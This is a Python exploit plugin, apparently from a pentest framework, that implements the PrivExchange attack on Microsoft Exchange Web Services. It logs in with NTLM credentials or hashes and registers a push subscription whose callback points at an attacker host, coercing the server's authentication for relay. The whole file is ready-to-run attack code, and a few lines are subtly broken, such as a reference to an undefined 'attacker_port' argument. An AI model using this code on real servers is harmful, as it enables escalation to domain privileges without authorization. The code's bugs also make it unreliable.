import argparse
import base64
import binascii
import re
import ssl
import xml.etree.ElementTree as ET
from copy import copy
from http.client import HTTPConnection, HTTPSConnection

from impacket import ntlm

from plugins.Exchange import PluginExchangeBase
from utils import output
from utils.consts import AllPluginTypes

EXCHANGE_VERSIONS = ["2010_SP1", "2010_SP2", "2013", "2016"]
POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
   <soap:Header>
      <t:RequestServerVersion Version="Exchange%s" />
   </soap:Header>
   <soap:Body >
      <m:Subscribe>
         <m:PushSubscriptionRequest SubscribeToAllFolders="true">
            <t:EventTypes>
              <t:EventType>NewMailEvent</t:EventType>
              <t:EventType>ModifiedEvent</t:EventType>
              <t:EventType>MovedEvent</t:EventType>
            </t:EventTypes>
            <t:StatusFrequency>1</t:StatusFrequency>
            <t:URL>%s</t:URL>
         </m:PushSubscriptionRequest>
      </m:Subscribe>
   </soap:Body>
</soap:Envelope>
'''


class PluginExchangePrivExchange(PluginExchangeBase):
    display = "priv exchange"
    alias = "ex_priv_ex"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-t", type=str, metavar='HOSTNAME', help="Hostname/ip of the Exchange server", dest="host")
        parser.add_argument("-u", "--user", metavar='USERNAME', help="username for authentication")
        parser.add_argument("-d", "--domain", metavar='DOMAIN',
                            help="domain the user is in (FQDN or NETBIOS domain name)")
        parser.add_argument("-p", "--password", metavar='PASSWORD', required=False,
                            help="Password for authentication, will prompt if not specified and no NT:NTLM hashes are supplied")
        parser.add_argument('--hashes', action='store', help='LM:NLTM hashes')
        parser.add_argument("--no-ssl", action=argparse.BooleanOptionalAction, default=False,
                            help="Don't use HTTPS (connects on port 80)")
        parser.add_argument("--exchange-port", help="Alternative EWS port (default: 443 or 80)")
        parser.add_argument("--lhost", required=True, help="Attacker hostname or IP", dest="lhost")
        parser.add_argument("--lport", default=80,
                            help="Port on which the relay attack runs (default: 80)", dest="lport")
        parser.add_argument("-v", "--version", choices=EXCHANGE_VERSIONS, default="2013",
                            help="Exchange dialect version (Default: 2013)", dest="version")
        parser.add_argument("--attacker-page", default="/privexchange/",
                            help="Page to request on attacker server (default: /privexchange/)")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        ews_url = "/EWS/Exchange.asmx"

        # Init connection
        if not args.no_ssl:
            # HTTPS = default
            port = 443
            if args.exchange_port:
                port = int(args.exchange_port)
            try:
                uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                session = HTTPSConnection(args.host, port, context=uv_context)
            except AttributeError:
                session = HTTPSConnection(args.host, port)
        else:
            # Otherwise: HTTP
            port = 80
            if args.exchange_port:
                port = int(args.exchange_port)
            session = HTTPConnection(args.host, port)

        # Construct attacker url
        if args.attacker_port != 80:
            attacker_url = 'http://%s:%d%s' % (args.lhost, int(args.lport), args.attacker_page)
        else:
            attacker_url = 'http://%s%s' % (args.lhost, args.attacker_page)
        output.info('Using attacker URL: %s', attacker_url)
        # Use impacket for NTLM
        ntlm_nego = ntlm.getNTLMSSPType1(args.lhost, domain=args.domain)

        # Negotiate auth
        negotiate = base64.b64encode(ntlm_nego.getData())
        # Headers
        # Source: https://github.com/thezdi/PoC/blob/master/CVE-2018-8581/Exch_EWS_pushSubscribe.py
        headers = {
            "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
            "Content-type": "text/xml; charset=utf-8",
            "Accept": "text/xml",
            "User-Agent": "ExchangeServicesClient/0.0.0.0",
            "Translate": "F"
        }

        session.request("POST", ews_url, POST_BODY % (args.version, attacker_url), headers)

        res = session.getresponse()
        res.read()

        # Copied from ntlmrelayx httpclient.py
        if res.status != 401:
            output.info('Status code returned: %d. Authentication does not seem required for URL', res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate'):
                output.error('NTLM Auth not offered by URL, offered protocols: %s', res.getheader('WWW-Authenticate'))
                return result
        except (KeyError, TypeError):
            output.error('No authentication requested by the server for url %s', ews_url)
            return result

        output.debug('Got 401, performing NTLM authentication')
        # Get negotiate data
        try:
            ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
            ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
        except (IndexError, KeyError, AttributeError):
            output.error('No NTLM challenge returned from server')
            return result

        if args.hashes:
            lm_hash_h, nt_hash_h = args.hashes.split(':')
            # Convert to binary format
            lm_hash = binascii.unhexlify(lm_hash_h)
            nt_hash = binascii.unhexlify(nt_hash_h)
            args.password = ''
        else:
            nt_hash = ''
            lm_hash = ''

        ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, args.user, args.password, args.domain, lm_hash,
                                            nt_hash)
        auth = base64.b64encode(ntlm_auth.getData())

        headers = {
            "Authorization": 'NTLM %s' % auth.decode('utf-8'),
            "Content-type": "text/xml; charset=utf-8",
            "Accept": "text/xml",
            "User-Agent": "ExchangeServicesClient/0.0.0.0",
            "Translate": "F"
        }

        session.request("POST", ews_url, POST_BODY % (args.version, attacker_url), headers)
        res = session.getresponse()

        output.debug('HTTP status: %d', res.status)
        body = res.read()
        output.debug('Body returned: %s', body)
        if res.status == 200:
            output.info('Exchange returned HTTP status 200 - authentication was OK')
            # Parse XML with ElementTree
            root = ET.fromstring(body)
            code = None
            for response in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseCode'):
                code = response.text
            if not code:
                output.error('Could not find response code element in body: %s', body)
                return result
            if code == 'NoError':
                output.info('API call was successful')
            elif code == 'ErrorMissingEmailAddress':
                output.error(
                    'The user you authenticated with does not have a mailbox associated. Try a different user.')
            else:
                output.error('Unknown error %s', code)
                for errmsg in root.iter(
                        '{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseMessages'):
                    output.error('Server returned: %s', errmsg.text)
            # Detect Exchange 2010
            for versioninfo in root.iter(
                    '{http://schemas.microsoft.com/exchange/services/2006/types}ServerVersionInfo'):
                if int(versioninfo.get('MajorVersion')) == 14:
                    output.info('Exchange 2010 detected. This version is not vulnerable to PrivExchange.')
        elif res.status == 401:
            output.error('Server returned HTTP status 401 - authentication failed')
        else:
            if res.status == 500:
                if 'ErrorInvalidServerVersion' in body:
                    output.error(
                        'Server does not accept this Exchange dialect, specify a different Exchange version with --exchange-version')
                    return result
            else:
                output.error('Server returned HTTP %d: %s', res.status, body)
                
        return result
